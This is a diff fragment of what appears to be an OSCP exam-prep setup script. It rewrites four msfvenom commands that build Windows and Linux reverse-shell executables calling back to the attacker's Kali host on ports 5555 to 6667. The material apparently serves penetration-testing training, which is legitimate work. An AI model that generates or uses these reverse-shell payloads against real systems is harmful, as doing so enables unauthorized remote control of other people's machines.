@@ -60,10 +60,10 @@ cd /home/kali/oscp/server
 
 # Payloads
 cd /home/kali/oscp/server/payloads
-msfvenom -p windows/shell_reverse_tcp LHOST="${kali}" LPORT=5555 -f exe > winrev1.exe
-msfvenom -p windows/shell_reverse_tcp LHOST="${kali}" LPORT=5556 -f exe > winrev2.exe
-msfvenom -p linux/x86/shell_reverse_tcp LHOST="${kali}" LPORT=6666 -f elf > linrev1
-msfvenom -p linux/x86/shell_reverse_tcp LHOST="${kali}" LPORT=6667 -f elf > linrev2
+msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5555 --out winrev1.exe
+msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5556 --out winrev2.exe
+msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6666 --format elf --out linrev
+msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6667 --format elf --out linrev2
 
 # Privesc
 cd /home/kali/oscp/server/privesc
